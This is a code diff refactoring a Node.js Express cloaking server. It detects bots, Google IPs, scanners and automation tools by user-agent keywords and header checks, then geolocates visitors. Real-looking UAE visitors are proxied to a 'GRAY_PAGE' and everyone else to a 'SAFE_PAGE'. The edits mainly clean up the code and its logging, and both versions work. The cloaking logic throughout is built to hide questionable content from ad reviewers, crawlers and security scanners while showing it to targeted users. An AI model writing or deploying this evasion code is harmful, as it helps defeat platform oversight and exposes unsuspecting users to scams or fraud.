@@ -27,7 +27,7 @@ const BOT_KEYWORDS = [
   "bot", "scanner", "analyzer", "validator", "parser", "scraper"
 ];
 
-// --- Suspicious User-Agents (headless/manual/bots disguised) ---
+// --- Suspicious User-Agents ---
 const SUSPICIOUS_AGENTS = [
   "headlesschrome", "phantomjs", "puppeteer", "axios", "curl", "fetch", "python"
 ];
@@ -37,35 +37,21 @@ async function isBot(req) {
   const ua = (req.headers["user-agent"] || "").toLowerCase();
   const ip = req.clientIp || req.ip;
 
-  console.log(`[DEBUG] isBot check: User-Agent = ${ua}`);
-
   const isUserAgentBot = BOT_KEYWORDS.some(bot => ua.includes(bot));
-  if (isUserAgentBot) {
-    console.log(`[DEBUG] isBot detected: By User-Agent keyword`);
-    return true;
-  }
+  if (isUserAgentBot) return true;
 
-  const commonHeadersPresent = (
+  const hasCommonHeaders = (
     req.headers["accept"] &&
     req.headers["accept-language"] &&
     req.headers["accept-encoding"]
   );
-  if (!commonHeadersPresent) {
-    console.log(`[DEBUG] isBot detected: Missing headers`);
-    return true;
-  }
+  if (!hasCommonHeaders) return true;
 
-  const isGoogleRelated = await isGoogleRelatedIP(ip);
-  if (isGoogleRelated) {
-    console.log(`[DEBUG] isBot detected: IP is Google-related (${ip})`);
-    return true;
-  }
-
-  console.log(`[DEBUG] isBot: No bot detected for IP=${ip}`);
-  return false;
+  const isGoogle = await isGoogleRelatedIP(ip);
+  return isGoogle;
 }
 
-// --- Check if IP is Google Related ---
+// --- Google IP Detection ---
 async function isGoogleRelatedIP(ip) {
   return new Promise(resolve => {
     if (!ip) return resolve(false);
@@ -81,25 +67,24 @@ async function isGoogleRelatedIP(ip) {
   });
 }
 
-// --- Check for real user (not bot, not automation, not fake VPN) ---
+// --- Check Real User ---
 function isLikelyRealUser(req) {
   const ua = (req.headers["user-agent"] || "").toLowerCase();
   const headers = req.headers;
 
-  const basicHeadersPresent = (
+  const basicHeaders = (
     headers["accept"] &&
     headers["accept-language"] &&
     headers["accept-encoding"]
   );
 
   const isSuspicious = SUSPICIOUS_AGENTS.some(key => ua.includes(key));
-
   const hasReferrer = headers["referer"] || headers["referrer"];
   const hasCookie = headers["cookie"];
 
   return (
     ua.includes("mozilla") &&
-    basicHeadersPresent &&
+    basicHeaders &&
     !ua.includes("bot") &&
     !ua.includes("google") &&
     !isSuspicious &&
@@ -108,7 +93,7 @@ function isLikelyRealUser(req) {
   );
 }
 
-// --- Proxy Target Page ---
+// --- Proxy Function ---
 async function proxyContent(targetUrl, req, res) {
   try {
     const headersToForward = {
@@ -142,12 +127,8 @@ async function proxyContent(targetUrl, req, res) {
     res.status(response.status);
     response.data.pipe(res);
   } catch (error) {
-    console.error(`Error proxying to ${targetUrl}:`, error.message);
-    if (error.response) {
-      res.status(error.response.status).send(`Error loading content from ${targetUrl}`);
-    } else {
-      res.status(500).send("Internal error");
-    }
+    console.error(`❌ Proxy error to ${targetUrl}:`, error.message);
+    res.status(500).send("Internal Server Error");
   }
 }
 
@@ -156,45 +137,52 @@ app.use(requestIp.mw());
 app.use(express.json());
 app.use(express.urlencoded({ extended: true }));
 
-// --- Universal Route Handler ---
+// --- Main Route Handler ---
 app.all("*", async (req, res) => {
   const ip = req.clientIp || req.ip || "no-ip";
   const ua = req.headers["user-agent"] || "no-agent";
   const path = req.originalUrl;
-
-  console.log(`[${new Date().toISOString()}] Path: ${path} | IP: ${ip} | UA: ${ua}`);
-
-  await new Promise(resolve => setTimeout(resolve, Math.floor(Math.random() * 500) + 100));
+  const referrer = req.headers["referer"] || req.headers["referrer"] || "none";
+  const cookie = req.headers["cookie"] || "none";
 
   let countryCode = null;
 
   try {
-    const geoApiResponse = await axios.get(`${GEO_API_URL}${ip}`);
-    console.log(`[DEBUG] GeoIP lookup result:`, geoApiResponse.data);
-
-    if (geoApiResponse.data && geoApiResponse.data.status === "success") {
-      countryCode = geoApiResponse.data.countryCode;
+    const geo = await axios.get(`${GEO_API_URL}${ip}`);
+    if (geo.data?.status === "success") {
+      countryCode = geo.data.countryCode;
     }
-  } catch (geoErr) {
-    console.error(`[ERROR] GeoIP failed for IP ${ip}:`, geoErr.message);
+  } catch (err) {
+    console.error(`🌐 GeoIP lookup failed for IP ${ip}:`, err.message);
   }
 
   const isFromUAE = countryCode === UAE_COUNTRY_CODE;
   const isDetectedBot = await isBot(req);
   const isRealUser = isLikelyRealUser(req);
 
+  // ✅ Debug log
+  console.log(`\n📥 Incoming Visitor`);
+  console.log(`- IP: ${ip}`);
+  console.log(`- Country: ${countryCode || "Unknown"}`);
+  console.log(`- UA: ${ua}`);
+  console.log(`- Referrer: ${referrer !== "none" ? referrer : "⛔️ None"}`);
+  console.log(`- Has Cookie: ${cookie !== "none" ? "✅ Yes" : "❌ No"}`);
+  console.log(`- isBot: ${isDetectedBot}`);
+  console.log(`- isRealUser: ${isRealUser}`);
+  console.log(`- Final Decision: ${isFromUAE && !isDetectedBot && isRealUser ? "➡️ GRAY_PAGE" : "🔒 SAFE_PAGE"}`);
+
+  await new Promise(resolve => setTimeout(resolve, Math.floor(Math.random() * 500) + 100));
+
   if (isFromUAE && !isDetectedBot && isRealUser) {
-    console.log("✅ UAE real visitor - redirecting to GRAY_PAGE");
     await proxyContent(GRAY_PAGE, req, res);
   } else {
-    console.log("🔒 Bot / Non-UAE / Suspicious visitor - redirecting to SAFE_PAGE");
     await proxyContent(SAFE_PAGE, req, res);
   }
 });
 
-// --- Start the Server ---
+// --- Start Server ---
 app.listen(PORT, () => {
-  console.log(`🚀 Server is running on port ${PORT}`);
-  console.log(`GRAY_PAGE (UAE): ${GRAY_PAGE}`);
-  console.log(`SAFE_PAGE (bots/others): ${SAFE_PAGE}`);
+  console.log(`🚀 Server running on port ${PORT}`);
+  console.log(`- GRAY_PAGE: ${GRAY_PAGE}`);
+  console.log(`- SAFE_PAGE: ${SAFE_PAGE}`);
 });
